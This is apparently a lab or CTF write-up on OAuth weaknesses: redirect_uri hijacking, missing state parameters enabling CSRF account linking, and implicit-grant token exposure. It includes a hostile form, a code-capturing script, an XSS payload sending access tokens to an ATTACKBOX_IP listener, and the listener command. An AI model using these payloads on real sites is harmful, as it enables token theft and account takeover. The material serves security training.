## 🔍 Detecting and Identifying OAuth Implementations
OAuth implementations manifest during login processes via HTTP redirects to authorization servers. Analysis of network traffic reveals specific query parameters indicating an active OAuth flow.

```http
# Example OAuth authorization URL demonstrating typical query parameters
[https://dev.coffee.thm/authorize?response_type=code&client_id=AppClientID&redirect_uri=https://dev.coffee.thm/callback&scope=profile&state=xyzSecure123](https://dev.coffee.thm/authorize?response_type=code&client_id=AppClientID&redirect_uri=https://dev.coffee.thm/callback&scope=profile&state=xyzSecure123)
```
* Tool: Web Browser / Proxy Intercept

Identification of the specific OAuth framework informs subsequent security assessments. Strategies for identification include:
* HTTP Headers and Responses: Inspecting headers and bodies for unique library identifiers.
* Source Code Analysis: Searching for framework-specific import statements (e.g., django-oauth-toolkit, oauthlib, spring-security-oauth, passport).
* Endpoint Analysis: Profiling authorization and token endpoint URL structures.
* Error Messages: Analyzing custom error outputs for technology stack disclosures.

## 🔀 Insecure Redirect URI Vulnerability


The `redirect_uri` parameter dictates the destination of the authorization token. Failure to strictly validate this parameter against pre-registered URIs permits token interception. If an attacker controls a domain permitted by the OAuth server, they can manipulate the flow.

```html
# Malicious HTML form forcing an OAuth flow with a hijacked redirect_uri
<form action="[http://coffee.thm:8000/oauthdemo/oauth_login/](http://coffee.thm:8000/oauthdemo/oauth_login/)" method="get">
    <input type="hidden" name="redirect_uri" value="[http://dev.bistro.thm:8002/malicious_redirect.html](http://dev.bistro.thm:8002/malicious_redirect.html)">
    <input type="submit" value="Hijack OAuth">
</form>
```
* Tool: Malicious Web Server

Once the victim authenticates, the authorization code is transmitted to the attacker-controlled URI, where client-side execution captures the parameter.

```javascript
# Client-side script to extract and log the authorization code from URL parameters
<script>
    const urlParams = new URLSearchParams(window.location.search);
    const code = urlParams.get('code');
    document.getElementById('auth_code').innerText = code;
    console.log("Intercepted Authorization Code:", code);
    // Exfiltration logic to store code
</script>
```
* Tool: Malicious Web Server

The attacker subsequently exchanges the intercepted code at the `/callback` endpoint for a valid access token.

## 🔗 State Parameter Absence and CSRF
The `state` parameter is an arbitrary string utilized to prevent Cross-Site Request Forgery (CSRF). The client application verifies that the returning state parameter matches the initially transmitted value. Omission or predictability of this parameter nullifies this validation.

Without state validation, an attacker can initiate an OAuth flow, retrieve an authorization code for their own account, and force a victim's session to consume it. This results in the attacker's third-party account being linked to the victim's primary account.

```python
# Backend logic demonstrating predictable authorization URL generation lacking state parameter
def oauth_logincsrf(request):
    app = Application.objects.get(name="ContactApp")
    redirect_uri = request.POST.get("redirect_uri", "[http://coffee.thm/csrf/callbackcsrf.php](http://coffee.thm/csrf/callbackcsrf.php)") 
    
    authorization_url = (
        f"[http://coffee.thm:8000/o/authorize/?client_id=](http://coffee.thm:8000/o/authorize/?client_id=){app.client_id}&response_type=code&redirect_uri={redirect_uri}"
    )
    return redirect(authorization_url)

def oauth_callbackflagcsrf(request):
    code = request.GET.get("code")
    
    if not code:
        return JsonResponse({'error': 'missing_code', 'details': 'Missing code parameter.'}, status=400) 

    if code:
        return JsonResponse({'code': code, 'Payload': '[http://coffee.thm/csrf/callbackcsrf.php?code='+code](http://coffee.thm/csrf/callbackcsrf.php?code='+code)}, status=400)
```
* Tool: Application Source Code

Execution involves the attacker delivering a payload URL (e.g., `http://bistro.thm:8080/csrf/callbackcsrf.php?code=xxxx`) to the victim. Upon execution, the accounts are linked.

## 🔓 Implicit Grant Flow Vulnerabilities


The Implicit Grant flow returns the access token directly within the URL fragment, introducing severe exposure risks. Best practices dictate deprecating this flow in favor of Authorization Code Flow with Proof Key for Code Exchange (PKCE).

Identified Weaknesses:
* URL Fragment Exposure: Tokens are accessible to any client-side script.
* Inadequate Redirect Validation: Facilitates endpoint manipulation.
* Lack of HTTPS: Vulnerable to Man-in-the-Middle (MitM) interception.
* Insecure Storage: Tokens held in localStorage or sessionStorage are susceptible to Cross-Site Scripting (XSS).

If an application employing Implicit Grant contains an XSS vulnerability, an attacker can inject an extraction payload.

```javascript
# XSS payload to parse the URL fragment, extract the token, and exfiltrate via image request
<script>
    var hash = window.location.hash.substr(1);
    var result = hash.split('&').reduce(function (res, item) {
        var parts = item.split('=');
        res[parts[0]] = parts[1];
        return res;
    }, {});
    
    var accessToken = result.access_token;
    var img = new Image();
    img.src = 'http://ATTACKBOX_IP:8081/steal_token?token=' + accessToken;
</script>
```
* Tool: XSS Payload

The attacker monitors a controlled network interface to capture the incoming HTTP request containing the token.

```bash
# Command to instantiate a basic HTTP listener for token capture
python3 -m http.server 8081
```
* Tool: Python HTTP Server
